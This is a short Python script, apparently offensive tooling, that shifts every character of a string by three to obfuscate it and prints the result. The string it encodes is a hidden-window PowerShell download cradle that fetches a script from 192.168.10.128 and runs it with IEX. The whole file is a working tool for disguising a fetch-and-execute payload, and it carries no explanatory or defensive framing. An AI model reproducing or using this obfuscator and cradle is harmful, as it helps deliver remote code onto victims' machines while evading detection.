#!/usr/bin/python

def encString(strencoded):
    newString = ""
    for char in strencoded:
        newString += chr(ord(char) + 3)
    return newString

def main():
    encStr = encString("powershell -WindowStyle Hidden \"IEX(New-Object Net.WebClient).downloadString('http://192.168.10.128/test.ps1')\"")
    print(encStr)


main()
